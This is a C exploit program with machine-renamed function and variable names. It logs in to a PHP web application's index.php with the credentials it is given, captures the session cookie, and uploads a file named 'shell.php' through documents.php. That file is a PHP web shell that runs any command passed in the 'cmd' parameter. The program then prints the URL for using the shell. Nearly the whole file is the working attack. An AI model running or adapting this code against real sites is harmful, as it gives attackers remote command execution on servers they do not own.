
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 scalar_t__ FUNC_0 (int,int) ;
 int FUNC_1 (int) ;
 int FUNC_2 (char*) ;
 int FUNC_3 (char*) ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (char*,int) ;
 char* FUNC_6 (int,int ) ;
 scalar_t__ FUNC_7 (int,char*,int) ;
 int FUNC_8 (char*,char*,char*,char*,...) ;
 int FUNC_9 (char*) ;
 char* FUNC_10 (char*,char*) ;
 char* FUNC_11 (char*,char*) ;
 int FUNC_12 (char*) ;

int FUNC_13(int VAR_0, char *VAR_1[]) {

 int VAR_2;
 char VAR_3[] = "--AaB03x\r\n"
     "Content-Disposition: form-data; name=\"doc\"; filename=\"shell.php\"\r\n"
     "Content-Type: text/plain\r\n"
     "\r\n"
     "<?php echo \"<pre>\"; system($_GET['cmd']); echo \"</pre>\"?>\r\n"
     "--AaB03x\r\n"
     "Content-Disposition: form-data; name=\"desc\"\r\n"
     "\r\n"
     "description\r\n"
     "--AaB03x\r\n"
     "Content-Disposition: form-data; name=\"submitadd\"\r\n"
     "\r\n"
     "Submit\r\n"
     "--AaB03x--\r\n",
  *VAR_4 = ((void*)0),
  *VAR_5 = ((void*)0),
  *VAR_6 = ((void*)0);

 if(VAR_0 < 5) {
  FUNC_12(VAR_1[0]);
  return -1;
 }

 if(!(VAR_4 = (char *)FUNC_0(200+FUNC_9(VAR_3)+FUNC_9(VAR_1[1])+FUNC_9(VAR_1[2])+FUNC_9(VAR_1[3])+FUNC_9(VAR_1[4]), sizeof(char)))) {
  FUNC_3("calloc");
  return -1;
 }

 FUNC_8(VAR_4, "POST %sindex.php HTTP/1.1\r\n"
     "Host: %s\r\n"
     "Content-Type: application/x-www-form-urlencoded\r\n"
     "Content-Length: %d\r\n\r\nuser=%s&pass=%s&submit=Login", VAR_1[2], VAR_1[1], (FUNC_9(VAR_1[4])+FUNC_9(VAR_1[3])+24), VAR_1[3], VAR_1[4]);


 FUNC_4("\n[*] Connecting...");

 if((VAR_2 = FUNC_5(VAR_1[1], 80)) < 0) {
  FUNC_4("[-] Connection failed!\n\n");
  FUNC_2(VAR_4);
  return -1;
 }

 FUNC_4("\n[+] Connected"
   "\n[*] Send login...");

 if(FUNC_7(VAR_2, VAR_4, FUNC_9(VAR_4)) < 0) {
  FUNC_4("[-] Sending failed!\n\n");
  FUNC_2(VAR_4);
  FUNC_1(VAR_2);
  return -1;
 }

 if(!(VAR_5 = FUNC_6(VAR_2, 0))) {
  FUNC_4("[-] Receive failed!\n\n");
  FUNC_2(VAR_4);
  FUNC_1(VAR_2);
  return -1;
 }

 if(!FUNC_10(VAR_5, "Login Successful")) {
  FUNC_4("\n[-] Login Incorrect!\n\n");
  FUNC_2(VAR_4);
  FUNC_1(VAR_2);
  return -1;
 }

 VAR_6 = FUNC_10(VAR_5, "PHPSESSID");
 VAR_6 = FUNC_11(VAR_6, ";");

 if((VAR_2 = FUNC_5(VAR_1[1], 80)) < 0) {
  FUNC_4("[-] Connection failed!\n\n");
  FUNC_2(VAR_4);
  return -1;
 }

 FUNC_4("\n[+] Login Successful"
   "\n[+] Uploading...");

 FUNC_8(VAR_4, "POST %sdocuments.php HTTP/1.1\r\n"
     "Host: %s\r\n"
     "Cookie: %s\r\n"
     "Content-type: multipart/form-data, boundary=AaB03x\r\n"
     "Content-Length: %d\r\n\r\n%s", VAR_1[2], VAR_1[1], VAR_6, FUNC_9(VAR_3), VAR_3);

 if(FUNC_7(VAR_2, VAR_4, FUNC_9(VAR_4)) < 0) {
  FUNC_4("[-] Sending failed!\n\n");
  FUNC_2(VAR_4);
  FUNC_1(VAR_2);
  return -1;
 }

 if(!(VAR_5 = FUNC_6(VAR_2, 0))) {
  FUNC_4("[-] Receive failed!\n\n");
  FUNC_2(VAR_4);
  FUNC_1(VAR_2);
  return -1;
 }

 if(!FUNC_10(VAR_5, "Uploaded Successfully")) {
  FUNC_4("\n[-] Upload failed!\n\n");
  FUNC_2(VAR_4);
  FUNC_1(VAR_2);
  return -1;
 }

 FUNC_2(VAR_4);
 FUNC_1(VAR_2);

 FUNC_4("\n[+] Shell uploaded"
   "\n[+] Connection closed\n\n"
   "Open your browser and go to http://%s%sgallery/documents/shell.php?cmd=[commands]\n\n", VAR_1[1], VAR_1[2]);

 return 0;

}
